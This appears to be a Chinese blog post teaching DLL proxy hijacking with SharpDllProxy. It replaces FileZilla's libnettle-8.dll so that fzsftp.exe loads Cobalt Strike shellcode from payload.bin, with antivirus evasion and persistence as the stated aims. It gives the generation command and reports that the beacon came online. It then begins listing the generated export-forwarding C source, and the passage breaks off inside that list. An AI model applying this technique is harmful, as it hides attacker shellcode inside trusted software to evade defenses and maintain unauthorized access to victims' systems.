    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>在程序开发过程中往往会使用第三方库，大多数第三方库会提供DLL(动态链接库)文件，因此程序需要相应的DLL文件才能启动，通过Dll代理将正常dll替换为欸一dll，可以进行免杀或权限维持</p><h2 id="找出运行必须的dll文件"><a href="#找出运行必须的dll文件" class="headerlink" title="找出运行必须的dll文件"></a>找出运行必须的dll文件</h2><p>依照<a href="https://cloud.tencent.com/developer/article/1739263">DLL代理加载shellcod用于免杀，维权等等</a>中的例子下载Filezilla，将fzsftp.exe放到单独文件夹运行，找到运行必须的libnettle-8.dll文件</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c7d34521-824d-4e6a-a5b8-0f0f4d0ae451.png" alt="imgbed.cn图床"></a></p><h2 id="编译SharpDllProxy"><a href="#编译SharpDllProxy" class="headerlink" title="编译SharpDllProxy"></a>编译SharpDllProxy</h2><p>下载<a href="https://github.com/Flangvik/SharpDllProxy">SharpDllProxy</a>后用Visual Stuio 2019打开SharpDllProxy.sln</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/c4a78070-bf3b-47e9-b1a4-b0341271a84a.png" alt="imgbed.cn图床"></a></p><p>编译生成SharpDllProxy.exe</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/92bcf89d-6ba8-475c-8a6e-e31a3d6dfa70.png" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f2af1a5d-1719-4994-ae6a-73edf135ca97.png" alt="imgbed.cn图床"></a></p><h2 id="生成代理Dll"><a href="#生成代理Dll" class="headerlink" title="生成代理Dll"></a>生成代理Dll</h2><p>指定目标dll文件后生成libnettle-8_pragma.c和tmp2BF5.dll，payload.bin为cs生成的raw格式shellcode。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">sharpdllproxy.exe --dll E:<span class="hljs-symbol">\d</span>llproxy<span class="hljs-symbol">\l</span>ibnettle-8.dll --payload E:<span class="hljs-symbol">\d</span>llproxy<span class="hljs-symbol">\p</span>ayload.bin<br></code></pre></td></tr></table></figure><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/d224dd7c-0e3f-4e6c-81c2-cca3e5fd95df.png" alt="imgbed.cn图床"></a></p><p>在vs中新建动态链接库将生成的libnettle-8_pragma.c代码复制后编译生成可执行shellcode的同名dll文件用以顶替原有的libnettle-8.dll文件</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/96a19b88-da49-4db1-8bb2-76220cee925b.png" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f9649196-5f3d-4208-bf0b-12b3238a90b3.png" alt="imgbed.cn图床"></a></p><p>成功执行shellcode需要4个文件,fzsftp.exe调用替换后的恶意libnettle-8.dll文件后从payload.bin中读取shellcode后执行，tmp2BF5.dll即原来正常的libnettle-8.dll文件，保证程序正常运行</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/a2ea32b4-e77d-4b6b-aaca-b2110c185cb7.png" alt="imgbed.cn图床"></a>执行后cs成功上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/83b16014-31cb-4acd-b432-91311808019c.png" alt="imgbed.cn图床"></a></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>用vs打开libnettle-8_pragma.c后查看代码，开头调用了400多个tmp2BF5.dll中的函数以保证文件的正常运行</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span> (disable : 4996)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aeads=tmp2BF5._nettle_aeads,@1&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_decrypt=tmp2BF5._nettle_aes_decrypt,@2&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_decrypt_aesni=tmp2BF5._nettle_aes_decrypt_aesni,@3&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_decrypt_x86_64=tmp2BF5._nettle_aes_decrypt_x86_64,@4&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_encrypt=tmp2BF5._nettle_aes_encrypt,@5&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_encrypt_aesni=tmp2BF5._nettle_aes_encrypt_aesni,@6&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_encrypt_table=tmp2BF5._nettle_aes_encrypt_table,@7&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_encrypt_x86_64=tmp2BF5._nettle_aes_encrypt_x86_64,@8&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_invert=tmp2BF5._nettle_aes_invert,@9&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_aes_set_key=tmp2BF5._nettle_aes_set_key,@10&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_armors=tmp2BF5._nettle_armors,@11&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_camellia_absorb=tmp2BF5._nettle_camellia_absorb,@12&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_camellia_crypt=tmp2BF5._nettle_camellia_crypt,@13&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_camellia_invert_key=tmp2BF5._nettle_camellia_invert_key,@14&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_camellia_table=tmp2BF5._nettle_camellia_table,@15&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_chacha_core=tmp2BF5._nettle_chacha_core,@16&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_ciphers=tmp2BF5._nettle_ciphers,@17&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_cpuid=tmp2BF5._nettle_cpuid,@18&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_ctr_crypt16=tmp2BF5._nettle_ctr_crypt16,@19&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_gcm_hash8=tmp2BF5._nettle_gcm_hash8,@20&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_gost28147_encrypt_block=tmp2BF5._nettle_gost28147_encrypt_block,@21&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_gost28147_param_CryptoPro_3411=tmp2BF5._nettle_gost28147_param_CryptoPro_3411,@22&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_gost28147_param_test_3411=tmp2BF5._nettle_gost28147_param_test_3411,@23&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_hashes=tmp2BF5._nettle_hashes,@24&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_macs=tmp2BF5._nettle_macs,@25&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_memxor_sse2=tmp2BF5._nettle_memxor_sse2,@26&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_memxor_x86_64=tmp2BF5._nettle_memxor_x86_64,@27&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_poly1305_block=tmp2BF5._nettle_poly1305_block,@28&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_poly1305_digest=tmp2BF5._nettle_poly1305_digest,@29&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_poly1305_set_key=tmp2BF5._nettle_poly1305_set_key,@30&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_ripemd160_compress=tmp2BF5._nettle_ripemd160_compress,@31&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_salsa20_core=tmp2BF5._nettle_salsa20_core,@32&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_sha1_compress_sha_ni=tmp2BF5._nettle_sha1_compress_sha_ni,@33&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_sha1_compress_x86_64=tmp2BF5._nettle_sha1_compress_x86_64,@34&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_sha256_compress=tmp2BF5._nettle_sha256_compress,@35&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_sha256_compress_sha_ni=tmp2BF5._nettle_sha256_compress_sha_ni,@36&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_sha256_compress_x86_64=tmp2BF5._nettle_sha256_compress_x86_64,@37&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_sha3_pad=tmp2BF5._nettle_sha3_pad,@38&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_sha3_update=tmp2BF5._nettle_sha3_update,@39&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_sha512_compress=tmp2BF5._nettle_sha512_compress,@40&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_l2=tmp2BF5._nettle_umac_l2,@41&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_l2_final=tmp2BF5._nettle_umac_l2_final,@42&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_l2_init=tmp2BF5._nettle_umac_l2_init,@43&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_l3=tmp2BF5._nettle_umac_l3,@44&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_l3_init=tmp2BF5._nettle_umac_l3_init,@45&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_nh=tmp2BF5._nettle_umac_nh,@46&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_nh_n=tmp2BF5._nettle_umac_nh_n,@47&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_poly128=tmp2BF5._nettle_umac_poly128,@48&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_poly64=tmp2BF5._nettle_umac_poly64,@49&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_umac_set_key=tmp2BF5._nettle_umac_set_key,@50&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_write_be32=tmp2BF5._nettle_write_be32,@51&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_write_le32=tmp2BF5._nettle_write_le32,@52&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:_nettle_write_le64=tmp2BF5._nettle_write_le64,@53&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_MD5Final=tmp2BF5.nettle_MD5Final,@54&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_MD5Init=tmp2BF5.nettle_MD5Init,@55&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_MD5Update=tmp2BF5.nettle_MD5Update,@56&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes128=tmp2BF5.nettle_aes128,@57&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes128_decrypt=tmp2BF5.nettle_aes128_decrypt,@58&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes128_encrypt=tmp2BF5.nettle_aes128_encrypt,@59&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes128_invert_key=tmp2BF5.nettle_aes128_invert_key,@60&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes128_set_decrypt_key=tmp2BF5.nettle_aes128_set_decrypt_key,@61&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_aes128_set_encrypt_key=tmp2BF5.nettle_aes128_set_encrypt_key,@62&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span 